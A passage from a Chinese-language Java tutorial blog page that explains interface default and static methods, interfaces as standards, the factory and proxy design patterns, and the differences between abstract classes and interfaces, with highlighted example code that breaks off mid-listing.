除了可以追加普通方法外，接口里面也可以定义static方法了，而static方法可以通过接口直接调用了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">IMessage2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">message</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//新增的方法，是一个公共方法，都具备</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">default</span> <span class="type">boolean</span> <span class="title function_">connect</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;建立消息的发送通道&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> IMessage2 <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MessageImpl2</span>();<span class="comment">//获得子类对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MessageImpl2</span> <span class="keyword">implements</span> <span class="title class_">IMessage2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">message</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.connect()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;mes9s0&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;没有消息发送&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test27</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IMessage2</span> <span class="variable">msg</span> <span class="operator">=</span> IMessage2.getInstance();</span><br><span class="line">        System.out.println(msg.message());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    接口里可以定义普通方法或static方法，那么这个功能就已经可以取代抽象类了，但是不应该将这两个组成作为接口的主要原则。接口的设计原则还是应该奉行：接口中就是抽象方法。</p><h5 id="使用接口定义标准"><a href="#使用接口定义标准" class="headerlink" title="使用接口定义标准"></a>使用接口定义标准</h5><p>​    对于接口而言在开发之中最为重要的应用就是进行标准的制定，实际上在日常的生活之中也会听见许多关于接口的名词，例如：USB接口、PCI接口等等。这些都是标准的应用。</p><p>​    例如电脑可以插各种USB接口，所以电脑上认的只是USB标准，而不关心这个标准的具体实现类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义USB标准</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IUSB</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">()</span>; <span class="comment">//检查通过可以工作</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">work</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Computer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">plugin</span><span class="params">(IUSB usb)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (usb.check()) &#123;</span><br><span class="line">            usb.work();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;硬件设备安装出现问题无法使用&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Keyboard</span> <span class="keyword">implements</span> <span class="title class_">IUSB</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">work</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;开始进行码字任务&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Print</span> <span class="keyword">implements</span> <span class="title class_">IUSB</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">work</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;开始进行照片打印&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test28</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Computer</span> <span class="variable">computer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Computer</span>();</span><br><span class="line">        computer.plugin(<span class="keyword">new</span> <span class="title class_">Keyboard</span>());<span class="comment">//插入键盘</span></span><br><span class="line">        computer.plugin(<span class="keyword">new</span> <span class="title class_">Print</span>());<span class="comment">//插入打印机</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73543.jpg"                      alt="image-20220625162340444"                ></p><h5 id="工厂设计模式（Factory）"><a href="#工厂设计模式（Factory）" class="headerlink" title="工厂设计模式（Factory）"></a>工厂设计模式（Factory）</h5><p>​    对于接口而言，已经可以明确的清楚，必须有子类，并且子类可以通过对象的向上转型来获取接口的实例化对象。但是在进行对象实例化的过程之中也有可能存在设计问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义一个食物标准</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IFood</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">eat</span><span class="params">()</span>;<span class="comment">//吃</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bread</span> <span class="keyword">implements</span> <span class="title class_">IFood</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;吃面包&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test29</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IFood</span> <span class="variable">food</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bread</span>();</span><br><span class="line">        food.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    本程序之中根据接口进行子类的定义，并且利用对象的向上转型进行接口实例化处理</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073544.jpg"                      alt="image-20220626153710000"                ></p><p>​    客户端需要明确具体的那一个子类，如果说现在面包吃腻了，需要牛奶了，那么客户端就要做出修改。</p><p>范例：扩展一类食物：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义一个食物标准</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IFood</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">eat</span><span class="params">()</span>;<span class="comment">//吃</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bread</span> <span class="keyword">implements</span> <span class="title class_">IFood</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;吃面包&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Milk</span> <span class="keyword">implements</span> <span class="title class_">IFood</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;喝牛奶&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test29</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IFood</span> <span class="variable">food</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Milk</span>();<span class="comment">//耦合</span></span><br><span class="line">        food.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    <strong>此时的程序就表示出现了耦合的问题，而造成耦合最直接的元凶：“关键字new”。以JVM的设计为例，Java实现可移植性的关键在于JVM，JVM的核心原理：利用一个虚拟机来运行Java程序，所有的程序并不与操作系统有任何的关联，而是由JVM来进行匹配。</strong>所以得出结论，良好的程序应该避免耦合。</p><p>工厂设计实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义一个食物标准</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IFood</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">eat</span><span class="params">()</span>;<span class="comment">//吃</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bread</span> <span class="keyword">implements</span> <span class="title class_">IFood</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;吃面包&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Milk</span> <span class="keyword">implements</span> <span class="title class_">IFood</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;喝牛奶&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Factory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> IFood <span class="title function_">getInstance</span><span class="params">(String className)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;break&quot;</span>.equals(className))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Bread</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;milk&quot;</span>.equals(className))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Milk</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test29</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IFood</span> <span class="variable">food</span> <span class="operator">=</span> Factory.getInstance(args[<span class="number">0</span>]);</span><br><span class="line">        food.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    在本程序之中，客户端程序类与IFood接口的子类没有任何的关联，所有的关联都是通过Factory类完成的，可以在需要使用的时候通过初始化参数进行要使用的子类定义：1、java Test29 bread。2、java Test29 milk。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073545.jpg"                      alt="image-20220626161125973"                ></p><p>​    如果在日后进行子类扩充的时候只需要修改Factory程序类即可实现。</p><h5 id="代理设计模式"><a href="#代理设计模式" class="headerlink" title="代理设计模式"></a>代理设计模式</h5><p>​    代理设计模式的主要功能是可以帮助用户将所有的开发注意力只集中在核心业务功能的处理上。</p><p>例如：肚子饿了想如何吃到东西</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073547.jpg"                      alt="image-20220705143753073"                ></p><p>范例：实现代理设计</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">IEat</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">get</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EatReal</span> <span class="keyword">implements</span> <span class="title class_">IEat</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【真实主题】得到一份食物，而后开始品尝美味&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//服务代理</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EatProxy</span> <span class="keyword">implements</span> <span class="title class_">IEat</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> IEat eat;<span class="comment">//为了吃而服务</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EatProxy</span><span class="params">(IEat eat)</span>&#123;<span class="comment">//一定要有一个代理项目</span></span><br><span class="line">        <span class="built_in">this</span>.eat = eat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">get</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.prepare();</span><br><span class="line">        <span class="built_in">this</span>.eat.get();</span><br><span class="line">        <span class="built_in">this</span>.clear();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">prepare</span><span class="params">()</span>&#123;<span class="comment">//准备过程</span></span><br><span class="line">        System.out.println(<span class="string">&quot;【代理主题】1、精心购买食材&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;【代理主题】2、小心的处理食材&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【代理主题】3、收拾碗筷&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test30</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IEat</span> <span class="variable">eat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EatProxy</span>(<span class="keyword">new</span> <span class="title class_">EatReal</span>());</span><br><span class="line">        eat.get();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073548.jpg"                      alt="image-20220705145659052"                ></p><p>​    代理设计模式的主要特点是：一个接口提供有两个子类，其中一个子类是真实的业务操作类，另外一个主题是代理业务操作类，没有代理业务，真实业务无法展开。</p><h5 id="抽象类与借口的区别"><a href="#抽象类与借口的区别" class="headerlink" title="抽象类与借口的区别"></a>抽象类与借口的区别</h5><p>​    在实际的开发之中，抽象类和接口的形式是非常相似的，这一点从JDK1.8开始实际上就很明显，因为在JDK1.8里接口可以定义default和static方法，但实际还有很多区别。</p><table><thead><tr><th>NO.</th><th>区别</th><th>抽象类</th><th>接口</th></tr></thead><tbody><tr><td>1</td><td>定义</td><td>abstract class 抽象类名称</td><td>Interface 接口名称</td></tr><tr><td>2</td><td>组成</td><td>构造、普通方法、静态方法、全局方法、普通成员、static方法</td><td>抽象方法、全局常量、普通方法、static方法</td></tr><tr><td>3</td><td>权限</td><td>可以使用各种权限定义</td><td>只能够使用public</td></tr><tr><td>4</td><td>子类使用</td><td>子类使用extends关键字继承一个抽象类</td><td>子类使用implements关键字可以实现多个接口</td></tr><tr><td>5</td><td>两者关系</td><td>抽象类可以实现若干个接口</td><td>接口不允许继承抽象类，但是允许继承多个父接口</td></tr><tr><td>6</td><td>使用</td><td>1、抽象类或接口必须定义子类；2、子类一定要覆写抽象类或接口中的全部抽象方法；3、通过子类的向上转型实现抽象类或接口对象实例化</td><td>1、抽象类或接口必须定义子类；2、子类一定要覆写抽象类或接口中的全部抽象方法；3、通过子类的向上转型实现抽象类或接口对象实例化</td></tr></tbody></table><p>​    当抽象类和接口都可以使用，要优先考虑接口，因为接口可以避免子类的单继承局限。</p><p>​    从另一个正常的设计角度而言，也需要先从接口来进行项目的整体设计。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073550.jpg"                      alt="image-20220705151117134"                ></p><hr><h4 id="综合案例：抽象类与接口应用"><a href="#综合案例：抽象类与接口应用" class="headerlink" title="综合案例：抽象类与接口应用"></a>综合案例：抽象类与接口应用</h4><p>​    抽象类与接口是Java里面最为核心的概念，也是所有设计模式的综合体现，包括在日后学习的过程之中也会接触到许多的系统提供的接口和抽象类。接口与抽象类都可以使用一定要优先接口。</p><h5 id="案例一（获取类信息）："><a href="#案例一（获取类信息）：" class="headerlink" title="案例一（获取类信息）："></a>案例一（获取类信息）：</h5><p>​    定义一个ClassName接口，接口中只有一个抽象方法getClassName()：设计一个Company，该类实现接口ClassName中的方法getClassName（），功能是获得该类的类名称：编写应用程序使用Company类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">IClassName</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getClassName</span><span class="params">()</span>;<span class="comment">//数据一定要返回</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Company</span> <span class="keyword">implements</span> <span class="title class_">IClassName</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getClassName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Company&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test31</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IClassName</span> <span class="variable">ica</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Company</span>();</span><br><span class="line">        System.out.println(ica.getClassName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="案例分析二"><a href="#案例分析二" class="headerlink" title="案例分析二"></a>案例分析二</h5><p>​    考虑一个表示绘图的标准，并且可以根据不同的图形来进行绘制；</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73551.jpg"                      alt="image-20220705163010337"                ></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义绘图标准</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IGraphical</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">paint</span><span class="params">()</span>;<span class="comment">//绘图</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> x;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> y;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Point</span><span class="params">(<span 